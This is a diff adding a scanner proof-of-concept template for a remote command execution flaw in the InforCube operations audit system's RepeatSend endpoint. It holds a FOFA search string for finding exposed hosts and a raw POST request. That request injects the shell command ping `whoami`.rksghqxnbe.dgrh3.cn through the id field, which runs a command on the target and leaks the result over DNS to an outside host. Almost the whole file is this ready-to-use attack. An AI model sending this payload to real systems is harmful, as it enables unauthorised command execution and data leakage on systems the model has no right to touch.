@@ -1,0 +1,27 @@
+id: poc-pio9z2gmti5w99tw
+info:
+  name: 上讯信息 InforCube运维管理审计系统 RepeatSend 前台RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pio9z2gmti5w99tw'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pio9z2gmti5w99tw
+    fofa: body="default/getloginhtml"
+http:
+- raw:
+  - 'POST /emailapply/RepeatSend HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    id=''%0aping `whoami`.rksghqxnbe.dgrh3.cn%0a'''
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
